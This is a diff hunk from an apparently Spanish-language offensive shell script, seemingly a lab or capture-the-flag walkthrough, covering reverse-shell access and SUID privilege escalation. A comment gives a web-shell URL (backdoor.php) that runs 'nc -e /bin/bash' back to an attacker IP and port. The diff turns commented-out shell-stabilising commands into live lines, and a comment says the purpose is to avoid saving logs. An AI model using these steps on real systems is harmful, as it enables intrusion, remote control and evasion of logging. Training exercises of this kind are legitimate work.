@@ -31,11 +31,11 @@ echo -e "\n--- 2. Obtención de Reverse Shell (Desde la Web Shell) ---"
 # URL: http://$TARGET_IP/backdoor.php?cmd=$(which%20nc)%20-e%20/bin/bash%20$ATTACKER_IP%20$LISTENER_PORT
 
 # 2.3. Mejorar la shell después de la conexión (para evitar guardar registros):
-# script /dev/null -c bash
-# export TERM=xterm
-# export SHELL=bash
-# stty raw -echo; fg
-# reset
+script /dev/null -c bash
+export TERM=xterm
+export SHELL=bash
+stty raw -echo; fg
+reset
 
 ## 3. Escalada de Privilegios (SUID - vim.basic)
 echo -e "\n--- 3. Escalada de Privilegios (SUID en /usr/bin/vim.basic) ---"
